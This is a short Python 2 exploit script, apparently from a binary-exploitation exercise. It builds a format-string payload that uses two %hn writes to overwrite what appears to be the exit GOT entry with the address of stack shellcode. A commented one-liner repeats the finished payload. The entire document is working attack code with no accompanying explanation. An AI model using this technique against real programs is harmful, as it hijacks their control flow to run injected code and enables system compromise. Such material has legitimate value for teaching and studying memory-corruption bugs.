position = 10

hbyte_exit = "\x08\x04\x97\xe0"[::-1]
lbyte_exit = "\x08\x04\x97\xe2"[::-1]

scode = 0xffffd788

addr2 = scode & 0xffff
addr1 = (scode >> 16) & 0xffff

#padding 1 after substracting address string sizes (8)
format1 = addr2 - 8
format2 = addr1 - addr2

#python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55168d%10$hn" + "%10359d%11$hn"'

f_str1 = "%%%dd%%%d$hn" % (format1, position)
f_str2 = "%%%dd%%%d$hn" % (format2, position + 1)

print "{}{}{}{}".format(hbyte_exit, lbyte_exit, f_str1, f_str2)